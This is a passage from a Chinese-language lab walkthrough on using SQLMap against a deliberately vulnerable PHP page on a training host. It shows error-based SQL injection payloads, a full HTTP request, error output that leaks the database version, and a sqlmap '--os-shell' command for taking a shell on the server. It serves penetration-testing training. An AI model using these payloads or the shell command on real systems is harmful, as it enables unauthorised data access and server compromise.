title=Hello' AND (SELECT 9239 FROM(SELECT COUNT(*),CONCAT(0x717a787071,(SELECT (ELT(9239=9239,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'avHv'='avHv&action=search
```

```
POST /sqli_6.php HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Origin: http://demo.ine.local
Connection: close
Referer: http://demo.ine.local/sqli_6.php
Cookie: PHPSESSID=hjdsm2548593prtqagvbvl2ov4; security_level=0
Upgrade-Insecure-Requests: 1

title=Hello' AND (SELECT 9239 FROM(SELECT COUNT(*),CONCAT(0x717a787071,(SELECT (ELT(9239=9239,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'avHv'='avHv&action=search
```

检查响应。由于重复条目，似乎是一个错误。

```
Error: Duplicate entry 'qzxpq1qbbqq1' for key 'group_key'
```

我们收到一条错误消息“重复条目 'qzxpq1qbbqq1' for key 'group_key'

第 27 步：更改将 version() 函数传递给数据库的请求。

有效载荷

```
title=Hello' AND (SELECT 9239 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT (ELT(9239=9239,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'avHv'='avHv&action=search
```

可以观察响应中的数据库版本信息

```
Error: Duplicate entry '5.5.47-0ubuntu0.14.04.11qbbqq1' for key 'group_key'
```

第 28 步：此外，我们可以使用 sqlmap `--os-shell` 选项获得一个 os shell。

命令

```
sqlmap -r request -p title --os-shell
```

```
which web application language does the webserver support?: 4
do you want sqlmap to further try to provoke the full path disclosure? y
Got a 302 redirect to 'http://demo.ine.local:80/login.php'. Do you want to follow? y
Redirect is a result of a POST request. Do you want to resend the original POST data to a new location? n
what do you want to use for the writable directory?: 4
```

这就是我们如何使用 SQLMap 来发现和利用 SQLi 漏洞的方法！
